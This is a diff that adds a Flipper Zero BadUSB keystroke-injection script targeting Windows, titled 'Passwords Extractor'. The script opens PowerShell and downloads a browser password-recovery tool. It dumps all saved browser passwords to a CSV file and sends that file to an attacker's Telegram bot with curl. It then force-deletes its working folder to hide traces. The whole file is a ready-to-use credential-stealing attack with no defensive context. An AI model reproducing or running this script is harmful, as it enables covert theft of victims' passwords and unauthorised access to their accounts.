@@ -1,0 +1,43 @@
+REM Title: Passwords Extractor
+REM Author: shp3x
+REM Description: Extracts saved passwords and send them via Telegram.
+REM Original: https://github.com/shp3x/FlipperZero/BadUSB/WebToTelegram.txt
+REM Target:	Windows
+REM
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 1000
+STRING $token='YOUR BOT TOKEN'
+ENTER
+STRING $user_id='YOUR TELEGRAM ID'
+ENTER
+DELAY 100
+STRING Remove-Item \temp -Recurse -Force -Confirm:$false ; mkdir \temp ; cd \temp ; Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip ; Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e wbpv.zip
+ENTER
+DELAY 5000
+STRING wbpv28821@
+ENTER
+STRING .\WebBrowserPassView.exe
+ENTER
+DELAY 3000
+CTRL A
+CTRL S
+DELAY 1000
+STRING c:\temp\export.csv
+TAB
+STRING csv
+ENTER
+DELAY 1000
+ALT F4
+DELAY 1000
+STRING curl.exe -F document=@"export.csv" https://api.telegram.org/bot$token/sendDocument?chat_id=$user_id"&"caption='<b>New+passwords+received!</b>'"&"parse_mode=HTML
+ENTER
+DELAY 500
+STRING cd \
+ENTER
+STRING Remove-Item \temp -Recurse -Force -Confirm:$false ;
+ENTER
+STRING EXIT
+ENTER
